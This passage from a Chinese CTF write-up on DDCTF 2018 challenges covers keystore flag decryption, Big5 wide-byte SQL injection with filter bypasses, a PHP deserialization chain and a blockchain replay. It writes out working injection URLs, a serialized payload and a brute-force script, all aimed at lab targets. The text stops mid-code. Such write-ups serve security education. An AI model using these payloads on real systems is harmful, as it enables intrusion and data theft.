&quot;HmacSHA256&quot;);</span><br><span class=\"line\">//        Mac mac = Mac.getInstance(&quot;HmacSHA256&quot;);</span><br><span class=\"line\">//        mac.init(signingKey);</span><br><span class=\"line\">//        byte[] e = mac.doFinal(String.valueOf(email.trim()).getBytes());</span><br><span class=\"line\">//        System.out.println(byte2hex(e));</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    public static void gencipher() throws Exception &#123;</span><br><span class=\"line\">        String p = &quot;sdl welcome you !&quot;.substring(0, &quot;sdl welcome you !&quot;.length() - 1).trim().replace(&quot; &quot;, &quot;&quot;);</span><br><span class=\"line\">        String ksPath = &quot;D:\\\\java\\\\ddctf\\\\src\\\\main\\\\java\\\\sdl.ks&quot;;</span><br><span class=\"line\">        KeyStore keyStore = KeyStore.getInstance(KeyStore.getDefaultType());</span><br><span class=\"line\">        FileInputStream inputStream = new FileInputStream(ksPath);</span><br><span class=\"line\">        keyStore.load(inputStream, p.toCharArray());</span><br><span class=\"line\">//        Key key = keyStore.getKey(&quot;www.didichuxing.com&quot;, p.toCharArray());</span><br><span class=\"line\">        Key key = keyStore.getCertificate(&quot;www.didichuxing.com&quot;).getPublicKey();</span><br><span class=\"line\">        Cipher cipher = Cipher.getInstance(key.getAlgorithm());</span><br><span class=\"line\">        cipher.init(2, key);</span><br><span class=\"line\">        String flag = &quot;019312D7231329ADEB986C6F994D7148B74AF9282B515F80F58A88BCE863F8848600CA69C4BE8F0D3BE3486B4FB7445C15169085F1DFE4D4B8439EF3472B50DE22D6E09BCCBC56542541D0C8F148B658005C2DD89202AEBF765998C2FA6AA197E5F6277587E78498F7E0A111429D3E1BEE2F4DD17224C0599FFA2FC1EE69B2521EEB96859EEB3D65DA88FED274739B208A81AF6280CF233B2064C6DB513AB9D53B010A456B8073C8C950E29034628C957108E7173390FBB4665229A6A9949188C8A5D43AE7CDB6244F082EF90EB3D2E126764CF90DE716A2150652AE3C13C0B457BD76E9BF1F9936AD85474CEDB23472039B5EC3387EF4FB5D5E3BD0FA681CDE&quot;;</span><br><span class=\"line\">        byte[] data = cipher.doFinal(hexStringToBytes(flag));</span><br><span class=\"line\">        System.out.println(new String(data));</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    public static String byte2hex(byte[] b) &#123;</span><br><span class=\"line\">        StringBuilder hs = new StringBuilder();</span><br><span class=\"line\"></span><br><span class=\"line\">        for(int n = 0; b != null &amp;&amp; n &lt; b.length; ++n) &#123;</span><br><span class=\"line\">            String stmp = Integer.toHexString(b[n] &amp; 255);</span><br><span class=\"line\">            if(stmp.length() == 1) &#123;</span><br><span class=\"line\">                hs.append(&apos;0&apos;);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">            hs.append(stmp);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        return hs.toString().toUpperCase();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    public static byte[] hexStringToBytes(String hexString) &#123;</span><br><span class=\"line\">        if (hexString == null || hexString.equals(&quot;&quot;)) &#123;</span><br><span class=\"line\">            return null;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        hexString = hexString.toUpperCase();</span><br><span class=\"line\">        int length = hexString.length() / 2;</span><br><span class=\"line\">        char[] hexChars = hexString.toCharArray();</span><br><span class=\"line\">        byte[] d = new byte[length];</span><br><span class=\"line\">        for (int i = 0; i &lt; length; i++) &#123;</span><br><span class=\"line\">            int pos = i * 2;</span><br><span class=\"line\">            d[i] = (byte) (charToByte(hexChars[pos]) &lt;&lt; 4 | charToByte(hexChars[pos + 1]));</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        return d;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    private static byte charToByte(char c) &#123;</span><br><span class=\"line\">        return (byte) &quot;0123456789ABCDEF&quot;.indexOf(c);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>通过这几行代码就可以获得一个加密后的邮箱了,邮箱使用首页展示的邮箱就行。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//        String email = &quot;email&quot;;</span><br><span class=\"line\">//        SecretKeySpec signingKey = new SecretKeySpec(&quot;sdl welcome you !&quot;.getBytes(), &quot;HmacSHA256&quot;);</span><br><span class=\"line\">//        Mac mac = Mac.getInstance(&quot;HmacSHA256&quot;);</span><br><span class=\"line\">//        mac.init(signingKey);</span><br><span class=\"line\">//        byte[] e = mac.doFinal(String.valueOf(email.trim()).getBytes());</span><br><span class=\"line\">//        System.out.println(byte2hex(e));</span><br></pre></td></tr></table></figure>\n<p>拿到该加密后的邮箱，就可以获得加密后的flag。</p>\n<p> <img src=\"/assets/ddctf/20180421191047.png\" alt=\"avatar\"></p>\n<p>拿到加密之后的flag之后，就可以解密了。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public static void gencipher() throws Exception &#123;</span><br><span class=\"line\">        String p = &quot;sdl welcome you !&quot;.substring(0, &quot;sdl welcome you !&quot;.length() - 1).trim().replace(&quot; &quot;, &quot;&quot;);</span><br><span class=\"line\">        String ksPath = &quot;D:\\\\java\\\\ddctf\\\\src\\\\main\\\\java\\\\sdl.ks&quot;;</span><br><span class=\"line\">        KeyStore keyStore = KeyStore.getInstance(KeyStore.getDefaultType());</span><br><span class=\"line\">        FileInputStream inputStream = new FileInputStream(ksPath);</span><br><span class=\"line\">        keyStore.load(inputStream, p.toCharArray());</span><br><span class=\"line\">        Key key = keyStore.getCertificate(&quot;www.didichuxing.com&quot;).getPublicKey();</span><br><span class=\"line\">        Cipher cipher = Cipher.getInstance(key.getAlgorithm());</span><br><span class=\"line\">        cipher.init(2, key);</span><br><span class=\"line\">        String flag = &quot;019312D7231329ADEB986C6F994D7148B74AF9282B515F80F58A88BCE863F8848600CA69C4BE8F0D3BE3486B4FB7445C15169085F1DFE4D4B8439EF3472B50DE22D6E09BCCBC56542541D0C8F148B658005C2DD89202AEBF765998C2FA6AA197E5F6277587E78498F7E0A111429D3E1BEE2F4DD17224C0599FFA2FC1EE69B2521EEB96859EEB3D65DA88FED274739B208A81AF6280CF233B2064C6DB513AB9D53B010A456B8073C8C950E29034628C957108E7173390FBB4665229A6A9949188C8A5D43AE7CDB6244F082EF90EB3D2E126764CF90DE716A2150652AE3C13C0B457BD76E9BF1F9936AD85474CEDB23472039B5EC3387EF4FB5D5E3BD0FA681CDE&quot;;</span><br><span class=\"line\">        byte[] data = cipher.doFinal(hexStringToBytes(flag));</span><br><span class=\"line\">        System.out.println(new String(data));</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n<p>该加密是RSA加密，需要拿到公钥才行，公钥的话，只需要通过以下代码就可</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">String ksPath = &quot;D:\\\\java\\\\ddctf\\\\src\\\\main\\\\java\\\\sdl.ks&quot;;</span><br><span class=\"line\">KeyStore keyStore = KeyStore.getInstance(KeyStore.getDefaultType());</span><br><span class=\"line\">FileInputStream inputStream = new FileInputStream(ksPath);</span><br><span class=\"line\">keyStore.load(inputStream, p.toCharArray());</span><br><span class=\"line\">Key key = keyStore.getCertificate(&quot;www.didichuxing.com&quot;).getPublicKey();</span><br></pre></td></tr></table></figure>\n<p>然后就可以解密得到flag.</p>\n<blockquote>\n<p>DDCTF{5218295657878818503}</p>\n</blockquote>\n<h1 id=\"注入的奥妙\"><a href=\"#注入的奥妙\" class=\"headerlink\" title=\"注入的奥妙\"></a>注入的奥妙</h1><h2 id=\"sql注入\"><a href=\"#sql注入\" class=\"headerlink\" title=\"sql注入\"></a>sql注入</h2><p>首先，测试单引号，双引号，会发现均会被转义，然后%df，直接就没反应了，过了一会，输了一个中文的单引号”‘“，发现输出竟然乱码。</p>\n<p> <img src=\"/assets/ddctf/20180421195946.png\" alt=\"avatar\"></p>\n<p> 然后就输入了几个中文，发现还是乱码，只有输入英文才没有乱码，应该是后台进行了编码转换。</p>\n<p> <img src=\"/assets/ddctf/20180421200130.png\" alt=\"avatar\"></p>\n<p> 于是便测试了一下是什么编码，经过测试，发现是Big5编码，后来发现题目在源码里边给出了提示链接（<a href=\"https://wenku.baidu.com/view/bd29b7b3fd0a79563c1e72f7.html)可惜做题时没看到。\" target=\"_blank\" rel=\"noopener\">https://wenku.baidu.com/view/bd29b7b3fd0a79563c1e72f7.html)可惜做题时没看到。</a></p>\n<p> <img src=\"/assets/ddctf/20180421200307.png\" alt=\"avatar\"></p>\n<p> 我选择了”么”</p>\n<p> <img src=\"/assets/ddctf/20180421200748.png\" alt=\"avatar\"></p>\n<p>通过测<code>http://116.85.48.105:5033/5d71b644-ee63-4b11-9c13-da3c4ac35b8d/well/getmessage/%E4%B9%88</code>，可以看到单引号成功逃逸。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"> 最后拼接的参数是 : ?\\\\&apos;</span><br><span class=\"line\">~~~如果自己拼接的参数显示有问题了，试试浏览器的页面编码设置~~~</span><br><span class=\"line\">很遗憾没有找到数据 可以试试别的 ！</span><br><span class=\"line\">42000 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &apos;&apos;?\\\\&apos;&apos;&apos; at line 1</span><br></pre></td></tr></table></figure>\n<p>单引号成功逃逸，然后就是简单的sql注入获取数据了，报错注入或者直接获取数据均可，还是手工,这里需要注意，部分字符串被过滤，只要双写绕过就行，同时由于编码的原因，直接获取数据的话，会报错编码有问题，我感觉应该就是这原因，出题人把错误展示出来了，需要编码不同的地方添加”collate utf8_general_cli”,强制转换编码即可。</p>\n<ul>\n<li><p>获取数据库。</p>\n<p> <code>http://116.85.48.105:5033/4f5aa917-e388-4aa5-bcdc-125b9b95e12a/well/getmessage/1%E4%B9%88&#39;%20uniunionon%20select%201,2,extracextractvaluetvalue(1,%20concat(0x3a,%20dadatabasetabase(),%200x3a))%23</code></p>\n<p> 得到结果”sqli”</p>\n</li>\n<li><p>获取’sqli’下的table。</p>\n<p> <code>http://116.85.48.105:5033/4f5aa917-e388-4aa5-bcdc-125b9b95e12a/well/getmessage/1么&#39; uniunionon select 1,2,extracextractvaluetvalue(1, concat(0x3a, (select group_concat(table_name) COLLATE utf8_general_ci from information_schema.tables where table_schema=0x73716c69), 0x3a))%23</code><br> 得到结果”message,route_rules”</p>\n</li>\n<li><p>获取”route_rules”的列名。</p>\n</li>\n<li><p><code>http://116.85.48.105:5033/4f5aa917-e388-4aa5-bcdc-125b9b95e12a/well/getmessage/1么&#39; uniunionon select 1,2,extracextractvaluetvalue(1, concat(0x3a, (select group_concat(column_name) COLLATE utf8_general_ci from information_schema.tables where table_schema=0x73716c69), 0x3a))%23</code><br> 得到结果”id,pattern,action,rulepass”</p>\n</li>\n<li><p>然后获取route_rules表中的数据。<br> 数据如下:<br> 1   get<em>/   u/well/getmessage/<br> 12  get</em>/   u/justtry/self/<br> 13  post*/  u/justtry/try<br> 15  static/bootstrap/css/backup.css static/bootstrap/css/backup.zip</p>\n</li>\n</ul>\n<h2 id=\"代码审计\"><a href=\"#代码审计\" class=\"headerlink\" title=\"代码审计\"></a>代码审计</h2><p>通过上边的<code>116.85.48.105:5033/5d71b644-ee63-4b11-9c13-da3c4ac35b8d/static/bootstrap/css/backup.css</code>，可以拿到代码。</p>\n<ul>\n<li>Jusstry.php</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public function try($serialize)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    unserialize(urldecode($serialize), [&quot;allowed_classes&quot; =&gt; [&quot;Index\\Helper\\Flag&quot;, &quot;Index\\Helper\\SQL&quot;,&quot;Index\\Helper\\Test&quot;]]);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>通过这段代码，可以看到使用了unserialize()方法，可能存在反序列化漏洞。</p>\n<ul>\n<li>Flag.php</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">namespace Index\\Helper;</span><br><span class=\"line\"></span><br><span class=\"line\">use PDO;</span><br><span class=\"line\">use Index\\Helper\\SQL;</span><br><span class=\"line\"></span><br><span class=\"line\">defined(&apos;ACCESS_FILE&apos;) or exit(&apos;No direct script access allowed&apos;);</span><br><span class=\"line\">class Flag</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    public $sql;</span><br><span class=\"line\"></span><br><span class=\"line\">    //</span><br><span class=\"line\">    public function __construct()</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        $this-&gt;sql=new SQL();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    //</span><br><span class=\"line\">    public function get($user)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        $tmp=$this-&gt;sql-&gt;FlagGet($user);</span><br><span class=\"line\">        if ($tmp[&apos;status&apos;]===1) &#123;</span><br><span class=\"line\">            return $this-&gt;sql-&gt;FlagGet($user)[&apos;flag&apos;];</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>该类说明只要调用get方法就可以得到指定用户的flag。</p>\n<ul>\n<li>Test.php</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">class Test</span><br><span class=\"line\">&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    public $user_uuid = &quot;4f5aa917-e388-4aa5-bcdc-125b9b95e12a&quot;;</span><br><span class=\"line\">    public $fl;</span><br><span class=\"line\"></span><br><span class=\"line\">    public function __construct()</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        echo &apos;hhkjjhkhjkhjkhkjhkhkhk&apos;;</span><br><span class=\"line\">        $this-&gt;fl = new Flag();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    public function __destruct()</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        $this-&gt;getflag(&apos;ctfuser&apos;, $this-&gt;user_uuid);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    public function setflag($m = &apos;ctfuser&apos;, $u = &apos;default&apos;, $o = &apos;default&apos;)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        $user=array(</span><br><span class=\"line\">            &apos;name&apos; =&gt; $m,</span><br><span class=\"line\">            &apos;oldid&apos; =&gt; $o,</span><br><span class=\"line\">            &apos;id&apos; =&gt; $u</span><br><span class=\"line\">        );</span><br><span class=\"line\">        // var_dump($user);</span><br><span class=\"line\"></span><br><span class=\"line\">        echo $this-&gt;fl-&gt;set($user, 2);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    public function getflag($m = &apos;ctfuser&apos;, $u = &apos;default&apos;)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        //TODO: check username</span><br><span class=\"line\">        $user=array(</span><br><span class=\"line\">            &apos;name&apos; =&gt; $m,</span><br><span class=\"line\">            &apos;id&apos; =&gt; $u</span><br><span class=\"line\">        );</span><br><span class=\"line\">        //懒了直接输出给你们了</span><br><span class=\"line\">        echo &apos;DDCTF&#123;&apos;.$this-&gt;fl-&gt;get($user).&apos;&#125;&apos;;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>在Test类中，可以看到调用了__destruct()方法，并且该方法调用了getflag方法。这样，只需要构造一个Test类，并令$f1=new Flag(),$user_uuid=”4f5aa917-e388-4aa5-bcdc-125b9b95e12a”，然后序列化，然后就可以获得flag了，需要注意的是，Flag.php中的$sql也是需要赋值的。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">namespace Index\\Helper;</span><br><span class=\"line\"></span><br><span class=\"line\">use Index\\Helper\\Flag;</span><br><span class=\"line\">use Index\\Helper\\UUID;</span><br><span class=\"line\"></span><br><span class=\"line\">class SQL</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    public $dbc;</span><br><span class=\"line\">    public $pdo;</span><br><span class=\"line\"></span><br><span class=\"line\">    //</span><br><span class=\"line\">    public function __construct()</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">class Flag</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    public $sql;</span><br><span class=\"line\"></span><br><span class=\"line\">    //</span><br><span class=\"line\">    public function __construct()</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        $this-&gt;sql=new SQL();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">// defined(&apos;ACCESS_FILE&apos;) or exit(&apos;No direct script access allowed&apos;);</span><br><span class=\"line\">class Test</span><br><span class=\"line\">&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    public $user_uuid = &quot;4f5aa917-e388-4aa5-bcdc-125b9b95e12a&quot;;</span><br><span class=\"line\">    public $fl;</span><br><span class=\"line\"></span><br><span class=\"line\">    public function __construct()</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        echo &apos;hhkjjhkhjkhjkhkjhkhkhk&apos;;</span><br><span class=\"line\">        $this-&gt;fl = new Flag();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    public function __destruct()</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        // $this-&gt;getflag(&apos;ctfuser&apos;, $this-&gt;user_uuid);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">echo serialize(new Test());</span><br></pre></td></tr></table></figure>\n<p>即可得到序列化之后的值:”hhkjjhkhjkhjkhkjhkhkhkO:17:”Index\\Helper\\Test”:2:{s:9:”user_uuid”;s:36:”4f5aa917-e388-4aa5-bcdc-125b9b95e12a”;s:2:”fl”;O:17:”Index\\Helper\\Flag”:1:{s:3:”sql”;O:16:”Index\\Helper\\SQL”:2:{s:3:”dbc”;N;s:3:”pdo”;N;}}}”,然后就可以得到flag了。</p>\n<p> <img src=\"/assets/ddctf/20180421150038.png\" alt=\"avatar\"></p>\n<h1 id=\"mini-blockchain\"><a href=\"#mini-blockchain\" class=\"headerlink\" title=\"mini blockchain\"></a>mini blockchain</h1><h2 id=\"构造符合条件的区块\"><a href=\"#构造符合条件的区块\" class=\"headerlink\" title=\"构造符合条件的区块\"></a>构造符合条件的区块</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import json</span><br><span class=\"line\">import hashlib</span><br><span class=\"line\">from itertools import product</span><br><span class=\"line\">import string</span><br><span class=\"line\">from functools import reduce</span><br><span class=\"line\">import rsa</span><br><span class=\"line\"></span><br><span class=\"line\">EMPTY_HASH = &apos;0&apos; * 64</span><br><span class=\"line\"></span><br><span class=\"line\">def hash(x):</span><br><span class=\"line\">    return hashlib.sha256(hashlib.md5(x.encode()).digest()).hexdigest()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">def hash_reducer(x, y):</span><br><span class=\"line\">    return hash(hash(x) + hash(y))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">def hash_block(block):</span><br><span class=\"line\">    return reduce(hash_reducer, [block[&apos;prev&apos;], block[&apos;nonce&apos;],</span><br><span class=\"line\">                                 reduce(hash_reducer, [tx[&apos;hash&apos;] for tx in block[&apos;transactions&apos;]], EMPTY_HASH)])</span><br><span class=\"line\"></span><br><span class=\"line\">block = &#123;</span><br><span class=\"line\">    &quot;nonce&quot;: &quot;6h0F&quot;,</span><br><span class=\"line\">    &quot;prev&quot;: &quot;0000031ffd8d820cfaef0a73a76dabee62cfce8922e929df101eba4d2c400be8&quot;,</span><br><span class=\"line\">    &quot;transactions&quot;: []</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">c = string.ascii_lowercase + &quot;0123456789ABCDEFGHI&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">captchas = [&apos;&apos;.join(i) for i in product(c, repeat=4)]</span><br><span class=\"line\"></span><br><span class=\"line\">print(&apos;[+] Genering &#123;&#125; captchas...&apos;.format(len(captchas)))</span><br><span class=\"line\">with open(&apos;captchas.txt&apos;, &apos;w&apos;) as f:</span><br><span class=\"line\">    for k in captchas:</span><br><span class=\"line\">        block[&quot;nonce&quot;] = k</span><br><span class=\"line\">        f.write(hash_block(block)[:5] + &apos; --&gt; &apos; + k + &apos;\\n&apos;)</span><br></pre></td></tr></table></figure>\n<p>“nonce”值是可控的，所有只要有修改nonce就可以生成任意的符合条件的区块。</p>\n<h2 id=\"解题\"><a href=\"#解题\" class=\"headerlink\" title=\"解题\"></a>解题</h2><p>初始区块链如图所示:</p>\n<p> <img src=\"/assets/ddctf/20180421221550.png\" alt=\"avatar\"></p>\n<p>然后，通过find_block_chain_tail方法，可以知道，该区块链是根据block[‘height’]来判断最后一个区块链，如果构造一个更长的区块链，那么就可以控制整个区块链。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">def find_blockchain_tail():</span><br><span class=\"line\">    return max(session[&apos;blocks&apos;].values(), key=lambda block: block[&apos;height&apos;])</span><br></pre></td></tr></table></figure>\n<p> <img src=\"/assets/ddctf/20180421222032.png\" alt=\"avatar\"></p>\n<p>从上边的图可以看到，如果构造3个区块，（事实上，也有一定的概率，创建两个区块就行了），那么最后一个区块就是区块6，这时候，一切都回到起点，银行又有了1000000，然后就可以转账，转账之后，在创建一个区块，就可以拿到第一个钻石,如图所示。</p>\n<p> <img src=\"/assets/ddctf/20180421222814.png\" alt=\"avatar\"></p>\n<p>接下来，来获取第二个钻石。这时候，只需要在区块7之后继续创建空的区块就行了。这样，shop又有了1000000，又可以买一个钻石，然后就可以拿到flag了。</p>\n<p> <img src=\"/assets/ddctf/20180421223014.png\" alt=\"avatar\"></p>\n<p>需要注意的是，flask是客户端session，区块多了之后，cookie也会变得很大，由于浏览器cookie是有限制的，这样，当set-cookie的值过大的时候，就会出现set-cookie失败的情况，所以这道题最好使用脚本发包。</p>\n<h1 id=\"我的博客\"><a href=\"#我的博客\" class=\"headerlink\" title=\"我的博客\"></a>我的博客</h1><h2 id=\"审计代码-1\"><a href=\"#审计代码-1\" class=\"headerlink\" title=\"审计代码\"></a>审计代码</h2><p>根据提示，下载<a href=\"http://www.tar.gz,里边共有三个文件，index.php\" target=\"_blank\" rel=\"noopener\">www.tar.gz,里边共有三个文件，index.php</a>, login.php, register.php。</p>\n<h3 id=\"index-php\"><a href=\"#index-php\" class=\"headerlink\" title=\"index.php\"></a>index.php</h3><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>($_GET[<span class=\"string\">'id'</span>]))&#123;</span><br><span class=\"line\">    $id = addslashes($_GET[<span class=\"string\">'id'</span>]);</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>($_GET[<span class=\"string\">'title'</span>]))&#123;</span><br><span class=\"line\">        $title = addslashes($_GET[<span class=\"string\">'title'</span>]);</span><br><span class=\"line\">        $title = sprintf(<span class=\"string\">\"AND title='%s'\"</span>, $title);</span><br><span class=\"line\">    &#125;<span class=\"keyword\">else</span>&#123;</span><br><span 